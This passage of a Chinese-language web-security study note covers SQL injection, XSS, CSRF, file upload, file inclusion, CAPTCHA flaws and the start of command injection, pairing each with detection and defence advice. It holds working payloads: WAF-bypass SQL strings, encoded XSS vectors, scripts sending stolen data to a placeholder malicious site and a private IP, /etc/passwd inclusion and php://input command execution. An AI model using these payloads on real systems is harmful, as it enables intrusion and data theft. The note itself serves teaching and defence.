在使用在基于延时的盲注中benchmark()和sleep()可以相互替换； ​ group_concat 、 concat 、concat_ws 三者可以互相替换； ​ 还有一种新的方法 ，3条语句分别如下 123substring((select ‘password’),1,1) = 0x70substr((select ‘password’),1,1) = 0x70mid((select ‘password’),1,1) = 0x70 ​ 都是从 password 里判断第一个字符的值，可以用 123strcmp(left(‘password’,1), 0x69) = 1strcmp(left(‘password’,1), 0x70) = 0strcmp(left(‘password’,1), 0x71) = -1 ​ 替换，left 用来取字符串左起 1 位的值，strcmp 用来比较两个值，如果比较结果相等就为 0，左边小的话就为-1，否则为 1。 9、盲注无需or和and ​ 例句：index.php?id=1 ​ 当and和or被过滤时，可以将 1修改为是通过语句生成的， 1index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123 123 的时候页面是正确的，现在再盲猜 hash 的第一位，如果第一位等于 0x42 也就是 B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是 B，就这样猜，不用 and 和 or 了。 10、加括号 123?id=(1)union(select(1),mid(hash,1,32)from(users)) ?id=(1)union(((((((select(1),hex(hash)from(users))))))))?id=(1)or(0x50=0x50) 11、缓冲区溢出绕过 ​ 如 1id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10 # ​ 其中 A 越多越好，一般要求 1000 个以上。 三、检测方法1、基于报错的检测方法 使用各种符号以及组合： ‘ “ ( % 如直接在URL后添加单引号看是否报错index.php?id=1’ 2、基于布尔的检测 最常用的如1’ and ‘1’=’1和1’ and ‘1’=’2 相当于 1’ and ‘1和1’ and ‘0 当返回的结果不同时即有漏洞 3、直接在URL地址后面加-1、-0、’%2B’和’%2B’a 添加-1：index.php?id=123-1，当前后访问的页面不同时，即可确定存在数字型SQL注入漏洞； 添加-0：index.php?id=123-0，当前后访问的页面相同时，再加上-1，返回错误页面，则表示存在数字型SQL注入漏洞； 添加’%2B’和’%2B’a：这里%2B为‘+’的URL编码，当先添加’%2B’时index.php?id=123’%2B’返回同样的页面，而添加’%2B’a时返回错误，这种适用于SQL语句中id值被一对单引号括起来的情况。 4、判断盲注的常用方法 1’ and 1=1 # 1’ and 1=2 # 判断这两种不同的输入是否有不一样的显示，如果一个正常一个通用的错误提示或者啥也不显示，则几乎可以确定是含有SQL注入漏洞的。 四、防御方法关键是对所有用户的输入进行严格的检查过滤、对数据库配置使用最小权限原则。 常用的修复方案 （1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。 （2）过滤危险的 SQL 语句关键字。 （3）确认每种数据的类型。 （4）数据长度应该严格规定。 （5）网站每个数据层的编码统一。 （6）严格限制网站用户的数据库的操作权限。 （7）避免网站显示 SQL 错误信息。 （8）在网站发布之前建议使用一些专业的 SQL 注入检测工具进行检测。 （9）升级 web 服务器运行平台软件补丁，建议使用 WAF 防护。 其实最有效的防御手段是下面两种： 1、预编译 原理是采用PreparedStatement将相应的SQL语句预先编译好，即SQL引擎会预先进行语法分析，产生语法树，生成执行计划，从而无论用户输入什么内容即使是sql命令都不会影响该SQL语句的语法结构而只能当成是字符串字面值参数。但并不是所有场景都能采用SQL预编译的，如需要进行一些字符串拼接的方式，这时便需要严格检查参数的数据类型以及采用一些安全函数来处理。 其过程如下: （1）定义预编译的sql语句，其中待填入的参数用?占位。 （2）创建预编译Statement，并把sql语句传入。此时sql语句已与此preparedStatement绑定。所以第4步执行语句时无需再把sql语句作为参数传入execute()。 （3）填入具体参数。通过setXX(问号下标，数值）来为sql语句填入具体数据。问号下标从1开始，setXX与数值类型有关，字符串就是setString（index，str）。 （4）执行预处理对象。 例子： 1234String sql=&quot;select id,no from user where id=?&quot;;PreparedStatement ps = conn.prepareStatement(sql);prestmt.setInt(1,id);prestmt.executeQuery(); 2、变量绑定 是指在sql语句的条件中使用变量而不是常量，是为了减少解析的。具体的细节网上很多，后面再补充。 XSS（跨站脚本）一、基本概念漏洞定义 跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 ​ XSS，全称cross-site scripting，是用于攻击Web客户端而不是服务器端，其最大的特点是能把恶意的JS或HTML代码注入到用户浏览的网页上。而XSS漏洞的存在，主要是由于Web应用程序对用户的输入没有进行严格的过滤所导致的，当攻击者把恶意代码注入到网页时，用户只要访问该网页就会执行其中的恶意代码。 成因 造成XSS漏洞的原因就是，攻击者的输入没有经过严格的控制，最终显示给来访的用户，攻击者通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java,VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、个人网页内容、会话和cookie等各种内容。 类型 主要分为以下前3种。 ​ 反射型（非持久）：主要用于将恶意代码附加到URL地址的参数中，常用于窃取客户端cookie信息和钓鱼欺骗。 ​ 存储型（持久型）：攻击者将恶意代码注入到Web服务器中并保存起来，只要客户端访问了相应的页面就会受到攻击。 ​ DOM型：利用浏览器的DOM特性，不是向浏览器发请求而是直接通过在本地执行从而修改或窃取本地的信息。 ​ Flash型：利用网页上flash文件的缺陷来执行js脚本，一般是反射型XSS。​ mXSS型：又被叫做突变XSS，主要被用于绕过XSS过滤。用户所提供的富文本内容通过javascript代码进入innerHTML属性后，一些意外的变化会使得一串看似没有任何危害的HTML代码，最终将进入某个DOM节点的innerHTML中，浏览器的渲染引擎会将本来没有任何危害的HTML代码渲染成具有潜在危险的XSS攻击代码。随后，该段攻击代码可能会被JS代码中的其它一些流程输出到DOM中或是其它方式被再次渲染，从而导致XSS的执行。 使用场景 ​ 直接嵌入html script标签中 ​ 元素标签事件 1&lt;body onload=alert(‘xss’)&gt; ​ 图片标签 img ​ 框架标签 iframe ​ DOM对象 利用方式 ​ 窃取用户cookie来非法登录访问目标站点； XSS与CSRF漏洞结合利用，使受害者在不知不觉中用用户的账号进行转账等敏感危险操作； ​ XSS蠕虫； ​ 执行恶意JS代码实现键盘记录； ​ 内嵌恶意HTML代码到页面中； ​ 页面恶意重定向； ​ 利用XSS进行DDOS，参考：SOHU视频XSS漏洞导致其用户成为DDOS肉鸡。 二、绕过WAF的方法利用&lt;&gt;标记注入HTML或JS 1&lt;script&gt;alert(‘xss’)&lt;/script&gt; 利用HTML标签属性值执行XSS 很多的HTML标记中的属性都支持javascript:[code]伪协议的形式 1&lt;img src=”javascript:alert('xss');”&gt; 空格回车TAB 空白不会影响JS语句的在正常执行 1&lt;img src=”javas cript:alert('xss')” width=100&gt; 对标签属性值进行转码 HTML属性值本身是支持ASCII码形式的 1&lt;img src=”javascript:alert('xss')” width=100&gt; ​ 其中t的ASCII码值为116，用“&amp;#116”来表示，而冒号:的ASCII值为58。 ​ 另外，Tab符的ASCII码为&amp;#9、换行符的为&amp;#10、回车符的为&amp;#13可以被插入到代码的任何地方中去。 ​ 还可以将&amp;#01、&amp;#02等字符插入到JavaScript的头部中。 产生自己的事件 ​ 事件是用户或浏览器自身执行的某个动作，如Click等 1&lt;img src=http://10.10.10.137/alan.jpg onerror=alert('xss')&gt; ​ onerror是img标签的一个事件，只要页面发生错误就会激活相应的事件。 ​ 除此之外还有各种事件，如：onResume、onfinish、onstop、onReverse等等。 利用CSS跨站剖析 ​ CSS是XSS的另一个载体，代码通常是嵌入到style标签/属性中的。 ​ 缺点是个浏览器之间不能通用。 扰乱过滤规则 转换大小写，顺序可以随意 双引号与单引号互换 不使用引号 注释符号 内嵌 字符编码 可以对代码进行十进制编码（&amp;#），可以在每个十进制字符后面加上分号；，也可以采用&amp;#0、&amp;#00；等的形式。 ​ JS中的eval()函数，用于计算字符串并执行其中的JS代码。可以使用\\连接十六进制字符串形式的脚本让eval()函数来执行，如 1&lt;script&gt;eval(“\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29”);&lt;/script&gt; ​ 也可以让其执行十进制形式的脚本，但需要和String.fromCharCode()函数一起使用、实现将字符转为ASCII值，如 1&lt;img src=\"javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))\"&gt; ​ 在利用CSS中，可以对style中的属性进行十六进制的编码来绕过。 Shellcode的调用 ​ 简单地说，Shellcode是指对一个漏洞进行利用的代码。 动态调用远程JS 将shellcode保存在其他服务器中，然后再用script标签来动态加载。除此之外，还可以通过基于DOM的方法创建和插入结点，把代码注入到网页中。这两种方式在利用中都有相应的演示。 使用window.location.hash ​ 即DOM型。location是JS管理地址栏的内置对象，location.hash则是用来获取或设置页面的标签值。相关的简单的利用已有示例，至于DOM型的XSS会有进一步的笔记。 三、检测方法​ 寻找脚本程序的输出显示代码，搜索关键字，显示输出那个变量，跟踪变量是否被过滤。 ​ 可以先输入一些内容，页面返回之后，可以查看网页源代码，搜索内容关键字看看是不是直接返回在页面的HTML代码中。 四、防御方法1、调用函数 ​ 对于用户提交的数据可以通过调用函数进行过滤，htmlspecialchars()函数将输出的内容进行HTML的编码，效果最好；str_replace()函数可以将指定的字符串转换为其他字符串的，但是会被绕过。 2、使用XSS Filter （1）输入过滤 ​ 输入验证（客户端）：前端JS过滤，如检测最大长度、是否只有合法字符、格式是否符合要求、数字是否在指定的范围内。缺点就是容易被修改掉。 ​ 数据消毒（服务器端）：过滤敏感字符（可以和SQL注入的一同过滤），如&lt; &gt; javascript ‘ “ &amp; # expression等。 （2） 输出编码（服务器端） ​ 可以使用HTML编码（PHP的htmlspecialchars()函数、ASP的Server.HTMLEncode()函数、ASP.NET的Server.HtmlEncode()函数），用对应的HTML实体替代字面量字符，此时浏览器会将恶意代码当作HTML文档的内容而不是结构加以处理。 常见恶意字符的HTML编码（显示、实体名字、实体编号）： &lt; &lt;; &amp;#60； > &gt; &amp;#62； &amp; &amp; &amp;#38； “ “ &amp;#34； ‘ ‘ 3、白名单和黑名单结合 4、Noscript ​ Firefox的一款免费的开源插件，默认禁止所有脚本，但是可以通过自定义设置允许通过的脚本。 5、Anti_XSS ​ 提供大量的编码函数用于处理用户的输入，实现白名单机制和输出转义。 6、HttpOnly ​ 攻击者通过XSS漏洞执行JS中的document.cookie方法来窃取用户的cookie信息。Web应用程序在Set-Cookie时将其属性设为HttpOnly即可避免Cookie被客户端JS存取，也可以保护用户的Cookie信息不被盗取。 ​ PHP设置HttpOnly的方法： ​ （1） 修改php.ini文件，设置其值为1或TRUE； ​ （2） setcookie()函数和setrawcookie()函数的第七个参数； ​ （3）在PHP代码中开启。 7、Web安全编码规范 ​ 对敏感字符转义、URL属性进行相应的规定等。 8、尽量使用WAF 9、防御DOM型XSS DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于： （1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现； （2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到 1&lt;script&gt; 则进行JS编码。 CSRF（跨站请求伪造）一、基本概念漏洞定义 跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。 成因 由于程序员的不严谨导致Web应用程序存在漏洞 Web浏览器对Cookie和HTTP身份验证等会话信息的处理存在缺陷 漏洞利用的前提 用户已经完成身份认证 新请求的提交不需要重新身份认证或确认机制 攻击者必须了解Web APP请求的参数构 用户会被吸引去点击链接 CSRF与XSS的区别与关系 XSS主要利用用户对站点的信任，而CSRF主要是利用站点对已知身份认证的信任。换句话说，XSS是用户自己点击链接来访问相应的网页的，而CSRF是在用户并不知情的情况下来提交请求的。另外，两者的产生的原因也不一样，CSRF的是因为采用了隐式的认证方式，而XSS的是因为对用户输入没有进行有效的过滤。 两者均利用用户的会话执行某些操作；若一个站点存在XSS漏洞，则很大可能也存在CSRF漏洞；若CSRF的恶意代码存在于第三方的站点，即使能有效地过滤用户的输入而防止XSS，也未必能防御CSRF。 攻击方式 GET型与POST型CSRF：主要取决于相应操作对提交方式的限制，其原理都是事先构造出一个恶意的请求，然后诱导用户点击或访问，从而假借用户身份完成相应的操作。另外，有些POST型CSRF也可能会利用javascript进行自动提交表单完成操作。 Flash型CSRF：通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如: Flash跨域权限管理文件设置为允许所有主机/域名跨域对本站进行读写数据： 1234This XML file does not appear to have any style information associated with it. The document tree is shown below.&lt;cross-domain-policy&gt; &lt;allow-access-from domain=\"*\"/&gt;&lt;/cross-domain-policy&gt; Flash跨域权限管理文件过滤规则不严(domain=”*”)，导致可以从其它任何域传Flash产生CSRF。 CSRF蠕虫：CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如：某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大！ 二、CSRF攻击获取数据的方法要获取的关键数据：用户 id、用户昵称、用户 email、用户个人页面地址等。 同域内 CSRF 攻击获取数据几乎没任何限制。 跨域 CSRF 攻击获取数据的几种方法总结如下： 1、结合XSS 组合漏洞 利用XSS 获取数据，如之前关于XSS文章做的三方的演示，使用目标站点上的XSS 漏洞： 1&lt;iframe width=0 height=0 src=‘http://目标站点/search.php?k=“&gt;&lt;script src=http://恶意站点/get.js&gt;&lt;/script&gt;’&gt;&lt;/iframe&gt; 其中get.js 的代码为： 12//use DOM method to get your datanew Image(). src=‘http://恶意站点/a.php?data=‘+data; 恶意站点的 a.php 文件接收唯一标识等数据，该唯一标识可以是 url 中的或是目标站点url 对应的内容中的。这样受害者就会访问到第三方的恶意网站从而泄露信息。 2、JSON Hijacing 目标站点使用了 JSON 数据传输用户私有数据，其中包含需要的唯一标识等信息。 相关代码： 12345&lt;script&gt; function hijack(o)&#123;//use DOM method to get your datanew Image().src=\"http://192.168.1.2/JSONHiJack.asp?hi=\"+escape(data);&#125;&lt;/script&gt;&lt;script src=http://api.fanfou.com/private_messages/inbox.json?callback=hijack&amp;count=2&gt;&lt;/script&gt; 3、Flash AsctionScript（crossdomain.xml） 前提是目标站点下存在crossdomain.xml文件，且其配置允许其他域的 AS脚本进行跨域请求。 1234&lt;?xml version=\"1.0\"?&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain=\"*\" /&gt;&lt;/cross-domain-policy&gt; 相关代码： 1234import flash.net.*; var _l = new URLLoader(new URLRequest(“http://目标站点/\"));_l.addEventListener(Event.COMPLETE,function()&#123;text1.text = _l.data&#125;);_l.load(); 4、服务端代理技术 三、检测方法最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。另外还需要确认数据包中确实没有含有token字样，即使有也尝试去掉再发包看是否是进行有效的CSRF校验即可。 一些专门针对 CSRF 漏洞进行检测的工具，如CSRFTester，CSRF Request Builder 等。 以 CSRFTester 工具为例，CSRF 漏洞检测工具的测试原理如下：使用 CSRFTester 进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在 CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。 四、防御方法1、 服务端的防御 主要有 5 种策略：验证 HTTP的Referer字段、在请求地址中添加 token 并验证、在 HTTP 头中自定义属性并验证、使用POST替代GET等。 （1）、验证 HTTP的Referer字段，在 HTTP 头的Referer字段记录了该 HTTP 请求的来源地址。顺便解决了非法盗链、站外提交等问题。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。 （2）、在请求地址中添加 token 并验证，可以在 HTTP请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。抵御 CSRF 攻击的关键在于：在请求中加入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。 （3）、在 HTTP 头中自定义属性并验证，也是使用 token 并进行验证，但并不是把 token以参数的形式置于 HTTP 请求而是放到 HTTP 头中自定义的属性里。通过XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把token 值放入其中。这样解决了前一种方法在请求中加入 token 的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会通过 Referer 泄露到其他网站。 （4）、严格区分好 POST 与 GET 的数据请求，尽量使用POST来替代GET，如在 asp 中不要使用 Request 来直接获取数据。同时建议不要用 GET 请求来执行持久性操作。 （5）、使用验证码或者密码确认方式，缺点是用户体验差。 2、 用户端的防御 用户的安全意识与良好的上网习惯。 3、 安全设备的防御 有些厂商的安全产品能基于硬件层面对HTTP 头部的 Referer 字段内容进行检查来快速准确的识别 CSRF 攻击。 文件上传漏洞一、基本概念漏洞定义 文件上传漏洞是指由于服务器端对于用户上传部分的控制不严格导致攻击者可以上传一个恶意的文件到服务器。简单点说，就是用户直接或者通过各种绕过方式将WebShell上传到服务器中进而执行利用。 成因 导致文件上传的漏洞的原因较多，主要包括以下几类： 服务器配置不当 开源编辑器上传漏洞 本地文件上传限制被绕过 过滤不严或被绕过 文件解析漏洞导致文件执行 文件路径截断 服务器配置不当 二、文件上传攻击分类1、轻量级检测绕过攻击 （1）绕过javascript 对扩展名的检测： 使用Burpsuite等反向代理工具直接POST数据包到服务端，绕过前端检测，如DVWA中的绕过示例。 （2）绕过服务端对http request 包MIME 类型检测： 使用Burpsuite等反向代理工具伪造POST 数据包到服务端，绕过MIME检测，如DVWA中的绕过示例。 2、文件内容检测绕过攻击 文件加载测试绕过：对文件进行代码注入再配合任意解析调用/漏洞。 3、上传攻击框架漏洞分层以及路径/扩展名检测绕过攻击 轻量级检测绕过攻击 绕过javascript 对扩展名的检测 代码层漏洞 绕过服务端对http request 包MIME 类型检测 代码层漏洞 路径、扩展名检测绕过攻击 黑名单绕过 白名单绕过 文件名大小写绕过名单列表绕过特殊文件名绕过0x00截断绕过.htaccess文件攻击PHP文件包含漏洞Apache解析漏洞IIS解析漏洞Nginx解析漏洞 代码层漏洞代码层漏洞代码层漏洞代码层漏洞代码层漏洞代码层漏洞应用层漏洞应用层漏洞应用层漏洞 0x00截断绕过PHP文件包含漏洞IIS解析漏洞Nginx解析漏洞 代码层漏洞代码层漏洞应用层漏洞应用层漏洞 4、文件内容检测绕过攻击 文件加载绕过 (代码层漏洞) 攻击手法与环节如图： 三、上传文件中的解析攻击1、直接解析（几乎没有防御） 比如直接上传一个扩展名是.php 的文件，只需要简单地绕过客户端javascript 检测或者服务端MIME 类型检测就行了。 2、配合解析(有一定程度的防御) 可以理解为先将代码注入到服务器上，上传一个带有一句话木马的图片或文件，等待一个解析的配合来实现攻击。 (1)、本地文件包含解析：主要是PHP本地文件包含 (2)、.htaccess文件解析 (3)、Web应用程序解析漏洞以及其原理： 1.Apache 解析漏洞： 解析： test.php.abc（其中abc为任意不属于黑名单且也不属于Apache解析白名单的名称） 描述：一个文件名为x1.x2.x3的文件，Apache 会从x3的位置往x1的位置开始尝试解析，如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样 一直往前尝试，直到遇到一个能解析的扩展名为止。 2.IIS 解析漏洞： 解析：test.asp/abc 或 test.asp;abc 名 或 abc/def.php （其中abc、def都为任意文件名） 描述：IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有”.asp;”会优先按asp来解析；IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL 后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。 3.Nginx 解析漏洞： 解析：abc/def.php 或 abc%00.php （其中abc、def都为任意文件名） 描述：目前Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/abc.php 的解析漏洞，如原本文件名是test.jpg则可以添加为test.jpg/x.php进行解析攻击。还有一种是对低版本的Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。 4.解析漏洞总结： Apache的扩展名顺序解析漏洞：Apache自身的漏洞 IIS的asp 解析漏洞：IIS自身的漏洞 Nginx的%00 解析漏洞：Nginx自身的漏洞 php-cgi的默认配置漏洞：这类以CGI 形式调用php的web 应用程序主要出现在IIS和Nginx；而Apache 通常是以module 的形式去调用php，所以很少出现该类型漏洞。 四、检测方法简单点的方法就是直接上传各种类型的文件，再通过Burpsuite修改各个可以绕过的检测内容来检测。 五、防御方法简单的防御方法为：获取文件扩展名进行白名单对比，然后对文件进行重命名。当然若存在解析漏洞等容易被绕过，具体点的防御方法如下： 1、客户端JavaScript检测：通常为检测文件扩展名) 2、服务端MIME 类型检测：检测Content-Type内容) 3、服务端目录路径检测：检测跟path参数相关的内容 4、服务端文件扩展名检测：检测跟文件extension 相关的内容 （1） 黑名单检测： 文件名大小写绕过：如 AsP，pHp。 名单列表绕过：用黑名单里没有的名单，如 asa 或 cer 等。 特殊文件名绕过：比如发送的 http 包里把文件名改成 test.asp. 或 test.asp (后面为空格)，这种命名方式在 Windows系统里是不能直接修改的，需要在Burpsuite等代理中进行修改，然后绕过验证后，会被Windows系统自动去掉后面的点和空格，但也只能用在Windows系统中。 0x00 截断绕过 双扩展名解析绕过攻击： (1)基于Web服务的解析逻辑：如果上传一个文件名为help.asp.123，扩展名123 不在扩展名黑名单中也没在Apache 可解析扩展名列表中，此时会向前搜寻下一个可解析的扩展名，若搜寻到.php，则会以php 执行。 (2) 基于Web服务的解析方式：如果在Apache的conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是test2.php.jpg也会以php 来执行。 危险解析绕过攻击：基于Web服务的解析方式：如果在Apache 的conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是jpg，一样能以php 方式执行。 .htaccess 文件攻击：配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测。 解析调用/漏洞绕过：直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞 （2） 白名单检测： 0x00 截断绕过：如test.asp%00.jpg 的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑漏洞进行攻击 解析调用/漏洞绕过：直接配合上传一个代码注入过的白名单文件，再利用解析调用/漏洞 .htaccess文件攻击：无论是黑名单还是白名单都可以直接攻击.htaccess 文件 如果PHP 安全没配置好，就可以通过move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的，这样就能任意定义解析名单了。 5、服务端文件内容检测(检测内容是否合法或含有恶意代码) ： （1）文件幻数检测： 主要是检测文件内容开始处的文件幻数，要绕过的话需要在文件开头写上检测的值，比如图片类型的文件幻数如下： JPG文件： GIF文件： PNG文件： 然后在文件幻数后面加上代码即可。 （2）文件相关信息检测： 图像文件相关信息检测常用的就是getimagesize()函数，需要把文件头部分伪造好，就是在幻数的基础上还加了一些文件信息，结构如下： GIF89a 123(...some binary data for image...) &lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) （3）文件加载检测： 一般是调用API 或函数去进行文件加载测试，常见的是图像渲染测试，甚至是进行二次渲染（过滤效果几乎最强）。 对渲染/加载测试的攻击方式：代码注入绕过，可以用图像处理软件对一张图片进行代码注入，但文件结构是完整的，渲染测试基本上都能绕过。用winhex查看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区。 对二次渲染的攻击方式：攻击文件加载器自身，常见的就是溢出攻击，上传恶意文件后服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode比如access/mdb 溢出；二次渲染相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。 示例代码： 12345678function image_gd_open(file, extension) &#123; extension = str_replace('jpg', 'jpeg', extension); open_func = 'imageCreateFrom'. extension; //函数名变成imageCreateFrompng 之类 if (!function_exists($open_func)) &#123; return FALSE; &#125; return open_func(file); //变成imagecreatefrompng('/tmp/php0lbTOn') &#125; 文件包含漏洞一、基本概念漏洞定义 简单地说，就是在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。 这里主要针对PHP语言。 PHP中的文件包含函数 include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。 include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。 require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 文件包含漏洞的一般特征 ?page=a.php ?home=a.html ?file=content 目录遍历（Directory traversal）和文件包含（File include）的一些区别 目录遍历是可以读取web根目录以外的其他目录，根源在于web application的路径访问权限设置不严，针对的是本系统。 文件包含是通过include函数将web根目录以外的目录的文件被包含进来，分为LFI本地文件包含和RFI远程文件包含。 几种经典的测试方法 ?file=../../../../../etc/passwdd ?page=file:///etc/passwd ?home=main.cgi ?page=http://www.a.com/1.php http://1.1.1.1/../../../../dir/file.txt （通过多个../可以让目录回到根目录中然后再进入目标目录） 编码绕过字符过滤 可以使用多种编码方式进行绕过 %00嵌入任意位置 .的利用 二、文件包含漏洞的利用技巧包含漏洞上传技巧： 一般将一句话木马和图片进行绑定上传。 包含读文件： 如http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php 包含写文件： 构造URL：http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://input，并且提交POST数据为： 1&lt;?php system(&apos;net user&apos;);?&gt; 等 包含日志文件： 当存在PHP本地文件包含漏洞，但无法上传正常文件时，可以利用Apache日志文件。Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中，例如： 1http://10.10.10.128/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\\logs\\access.log PHP内置的协议： 三、检测方法找到有包含函数的页面，对函数内容进行替换查看结果； 可以使用工具来代替手工的过程，如Kadimus、Burpsuite的插件LFI scanner checks等； 白盒测试时，可以在源代码中查看allow_url_fopen、allow_url_include等敏感函数是否开启。 四、防御方法1、严格判断包含中的参数是否外部可控。 2、路径限制，限制被包含的文件只能在某一个文件夹内，特别是一定要禁止目录跳转字符，如：“../”。 3、基于白名单的包含文件验证，验证被包含的文件是否在白名单中。 4、尽量不要使用动态包含，可以在需要包含的页面固定写好，如：“include(“head.php”)”。 5、可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。 不安全的验证码一、基本概念漏洞定义 验证码问题归类为逻辑漏洞类问题，通常是开发者编写代码时存在设计缺陷、可导致某些特殊情况使得验证码可被绕过，从而使得验证码的防御机制形同虚设。 原理过程 1.客户端发起一个请求 2.服务端响应并创建一个新的 SessionID 同时生成一个随机验证码 3.服务端将验证码和 SessionID 一并返回给客户端 4.客户端提交验证码连同 SessionID 给服务端 5.服务端验证验证码同时销毁当前会话，返回给客户端结果 二、验证码的安全问题客户端问题： 1、 客户端生成验证码：验证码由客户端 JS生成并且仅仅在客户端用JS验证。 2、 验证码输出客户端：输出在HTML中，不应该把验证码的内容发送到客户端 cookie 或输出到response headers的其他字段中。 3、 验证码输出在 cookie 中：有些系统默认不显示验证码，而是在用户校验错误一定次数之后再出现。那如何判断用户已经错误几次了呢？若是如下判断： （1）在 cookie 中写入一个标记，比如 loginErr = 1，后续错误累加 （2）在 session 中写入一个标记，例如 loginErr = 1，后续错误累加 这样问题在于，要是攻击者不带 Cookie 提交 HTTP 请求或不更新 Cookie中 loginErr 的值反复提交，这样程序会因为无从获取 Cookie/sessionID，会认为攻击者是首次访问，从而验证码不会出现。 服务器端问题： 1、 验证码不过期，没有及时销毁会话导致验证码复用 2、 没有进行非空判断 3、 产生的验证码问题集内的答案非常有限 三、检测方法简单的方法，先是手工登录几次，查看是否出现验证码以及验证码是否失效，然后再通过Burpsuite来进一步测试。 四、防御方法1、 强制要求输入验证码，否则必须实施 IP 策略。注意不要被 X-Forwarded-For（用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段） 绕过了。 2、 验证码只能用一次，用完立即过期。 3、 验证码强度增强，使用扭曲、变形、干扰线条、干扰背景色、变换字体等。 4、 大网站最好统一安全验证码，各处使用同一个验证码接口。 命令注入漏洞一、基本概念漏洞定义 当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，达到任意命令执行的效果。 这里以PHP为主，以后在Java分类中会单独总结Java类的漏洞。 成因 程序未严格区分用户输入的内容是数据还是代码。 PHP与命令执行漏洞相关的函数 1、PHP的5种命令执行函数：system()、exec()、passthru()、shell_exec()、运算符 